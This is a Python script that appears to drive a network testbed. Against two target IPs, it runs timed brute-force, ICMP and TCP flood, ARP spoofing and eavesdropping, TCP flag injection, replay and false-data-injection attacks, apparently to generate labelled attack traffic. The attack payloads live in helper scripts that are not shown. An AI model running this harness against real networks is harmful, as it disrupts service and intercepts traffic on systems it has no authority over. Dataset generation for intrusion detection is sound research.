from datetime import datetime, timedelta
import os
import argparse
import subprocess
from time import sleep
import random

import signal

from tqdm import tqdm

import logging

TIME_DURATION = timedelta(minutes=30)

logging.basicConfig(
    format='%(asctime)s, %(msecs)d %(name)s - %(levelname)s : %(message)s',
    datefmt='%H:%M:%S',
    level=logging.DEBUG  
)

level_map = {
    'debug': logging.debug,
    'info': logging.info,
    'warning': logging.warning,
    'error': logging.error,
    'critical': logging.critical,
}
def logger(level_name,message):

        log_func = level_map[level_name.lower()]
        if log_func:
            log_func(message)
        else:
            logging.error(f"Invalid logging level: {level_name}")
            
            
def run_command(command):
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        
        
        total_seconds = int(TIME_DURATION.total_seconds())
        
        for _ in tqdm(range(total_seconds), desc="Attack duration", unit="s"):
            sleep(1)
            
            
        pgid = os.getpgid(proc.pid)

        os.killpg(pgid, signal.SIGINT)
        
        sleep(2)
        
    except Exception as e:
        logger('error', f"Error running command: {e}")
    
    return


def run_2_command(command1, command2):
    try:
        proc1 = subprocess.Popen(command1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        proc2 = subprocess.Popen(command2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        
        total_seconds = int(TIME_DURATION.total_seconds())
        
        for _ in tqdm(range(total_seconds), desc="Attack duration", unit="s"):
            sleep(1)
            
        pgid1 = os.getpgid(proc1.pid)
        pgid2 = os.getpgid(proc2.pid)

        os.killpg(pgid1, signal.SIGINT)
        os.killpg(pgid2, signal.SIGINT)
        
        sleep(3)
        
    except Exception as e:
        logger('error', f"Error running command: {e}")
    
    return


## FLOODING ATTACKS            
def bruteforce_char(ip_addr):
    
    command= f'sudo python3 bruteforce_char.py {ip_addr} sample_username'
    run_command(command)
    
    return
    

def dos_imcp(ip_addr):
    
    command = f'sudo python3 dos_icmp.py'
    
    run_command(command)
    
    return

def dos_tcp(ip_addr):
    
    command = f'sudo python3 dos_tcp.py'
    
    run_command(command)
    
    return
    
    
## IMPERSONATION ATTACKS
def arp_spoof(ip_addr1, ip_addr2):
    
    command = f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0 -r 1'
    
    run_command(command)
        
    return

def arp_eveadropping(ip_addr1, ip_addr2):
        
    command = f'sudo python3 arp_eavesdrop.py {ip_addr1} {ip_addr2} -r 1'
    
    run_command(command)
        
    return

def arp_blackout(ip_addr):
    command = f'sudo python3 arp_blackout.py {ip_addr}'
    
    run_command(command)
        
    return

## Injection ATTACKS
def tcp_flag_injection(ip_addr):
    
    command = f'sudo python3 tcp_flag_injection.py {ip_addr} -f 19'
    
    run_command(command)
    
    return

def replay_attack(ip_addr1, ip_addr2):
    command1= f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0 -r 1'
    command2 = f'sudo python3 replay_tool.py {ip_addr1} -a -r freqlog.csv'
    
    run_2_command(command1, command2)
    
    return

def fdia_attack(ip_addr1, ip_addr2):
    command1= f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0 -r 1'
    command2 = f'sudo python3 FDIA.py {ip_addr2} -p 30502 -f gaussian'
    
    run_2_command(command1, command2)
    
    return
            
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='DS/ SIGNAL GENERATION')
    parser.add_argument('target1', help='IP of first target')
    parser.add_argument('target2', help='IP of second target')
    
    TIME_DURATION = timedelta(minutes=10)
      
    args = parser.parse_args()
    
    IP_ADDR_1= args.target1
    IP_ADDR_2=args.target2
    
    # FLOODING
    ## Bruteforce attack
    tick=datetime.now()
    logger('info',f"Starting Bruteforce attack on {IP_ADDR_1} at {tick}")
    bruteforce_char(IP_ADDR_1)
    tock=datetime.now()
    logger('info',f"Finished Bruteforce attack on {IP_ADDR_1} at {tock}")
    logger('info',f"Duration of Bruteforce attack on {IP_ADDR_1}: {tock-tick}")
    sleep(int(random.randint(120, 180)))
    
    ## ICMP Flooding attack
    tick=datetime.now()
    logger('info',f"Starting ICMP flooding attack on {IP_ADDR_1} at {tick}")
    dos_imcp(IP_ADDR_1)
    tock=datetime.now()
    logger('info',f"Finished ICMP flooding attack on {IP_ADDR_1} at {tock}")
    logger('info',f"Duration of ICMP flooding attack on {IP_ADDR_1}: {tock-tick}")
    sleep(int(random.randint(120, 180)))
    
    ## TCP Flooding attack
    tick=datetime.now()
    logger('info',f"Starting TCP flooding attack on {IP_ADDR_1} at {tick}")
    dos_tcp(IP_ADDR_1)
    tock=datetime.now()
    logger('info',f"Finished TCP flooding attack on {IP_ADDR_1} at {tock}")
    logger('info',f"Duration of TCP flooding attack on {IP_ADDR_1}: {tock-tick}")
    sleep(int(random.randint(120, 180)))
    
    # IMPERSONATION ATTACKS
    ## ARP Spoofing attack
    
    tick=datetime.now()
    logger('info',f"Starting ARP Spoofing attack on {IP_ADDR_1} and {IP_ADDR_2} at {tick}")
    arp_spoof(IP_ADDR_1, IP_ADDR_2)
    tock=datetime.now()
    logger('info',f"Finished ARP Spoofing attack on {IP_ADDR_1} and {IP_ADDR_2} at {tock}")
    logger('info',f"Duration of ARP Spoofing attack on {IP_ADDR_1} and {IP_ADDR_2}: {tock-tick}")
    sleep(int(random.randint(120, 180)))
    
    ## ARP Eveadropping attack
    tick=datetime.now()
    logger('info',f"Starting ARP Eveadropping attack on {IP_ADDR_1} and {IP_ADDR_2} at {tick}")
    arp_eveadropping(IP_ADDR_1, IP_ADDR_2)
    tock=datetime.now()
    logger('info',f"Finished ARP Eveadropping attack on {IP_ADDR_1} and {IP_ADDR_2} at {tock}")
    logger('info',f"Duration of ARP Eveadropping attack on {IP_ADDR_1} and {IP_ADDR_2}: {tock-tick}")
    sleep(int(random.randint(120, 180)))
    
    
    # Injection ATTACKS
    ## TCP Flag Injection attack
    tick=datetime.now()
    logger('info',f"Starting TCP Flag Injection attack on {IP_ADDR_1} at {tick}")
    tcp_flag_injection(IP_ADDR_1)
    tock=datetime.now()
    logger('info',f"Finished TCP Flag Injection attack on {IP_ADDR_1} at {tock}")
    logger('info',f"Duration of TCP Flag Injection attack on {IP_ADDR_1}: {tock-tick}")
    sleep(int(random.randint(120, 180)))
    
    ## Replay attack
    tick=datetime.now()
    logger('info',f"Starting Replay attack on {IP_ADDR_1} and {IP_ADDR_2} at {tick}")
    replay_attack(IP_ADDR_1, IP_ADDR_2)
    tock=datetime.now()
    logger('info',f"Finished Replay attack on {IP_ADDR_1} and {IP_ADDR_2} at {tock}")
    logger('info',f"Duration of Replay attack on {IP_ADDR_1} and {IP_ADDR_2}: {tock-tick}")
    sleep(int(random.randint(120, 180)))
    
    ## FDIA attack
    tick=datetime.now()
    logger('info',f"Starting FDIA attack on {IP_ADDR_1} and {IP_ADDR_2} at {tick}")
    fdia_attack(IP_ADDR_1,IP_ADDR_2)
    tock=datetime.now()
    logger('info',f"Finished FDIA attack on {IP_ADDR_1} and {IP_ADDR_2} at {tock}")
    logger('info',f"Duration of FDIA attack on {IP_ADDR_1} and {IP_ADDR_2}: {tock-tick}")
    
    
    logger('info',f"Finished all attacks on {IP_ADDR_1} and {IP_ADDR_2} at {tock}")